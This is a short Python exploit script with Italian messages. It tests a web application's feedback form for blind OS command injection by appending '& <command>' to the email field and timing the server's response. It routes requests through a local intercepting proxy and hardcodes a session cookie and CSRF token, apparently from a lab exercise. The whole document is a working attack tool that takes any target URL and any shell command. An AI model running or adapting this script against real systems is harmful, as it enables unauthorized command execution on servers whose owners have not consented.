import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def blind_command_injection_check(url,command):
    uri = "/feedback/submit"
    command_injection = "test & " + command
    cookies = {'session' : 'rrvNghFktzBOzosLsfQROrqhEa0g0qxK'}
    data = {'csrf' : 'QAldZPrqFDJ8RfY7sNrycJT359CE9ZSU' , 'name' : 'test', 'email' : command_injection, 'subject' : 'test', 'message' : 'test'}
    r = requests.post(url + uri, data=data, cookies=cookies, verify=False, proxies=proxies)
    return r



def main():
    if len(sys.argv) != 3:
        print("[-] Utilizzo: %s <url> <command>" % sys.argv[0])
        print("[-] Esempio: %s www.esempio.com whoami" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]
    command = sys.argv[2]
    response = blind_command_injection_check(url,command)
    if not response:
        print("[-] Web App non vulnerabile a OS Command Injection Vulnerability.")
    else:
        print("[+] Tempo risposta server %.2f secondi" % float(response.elapsed.total_seconds()))



if __name__ == "__main__":
    main()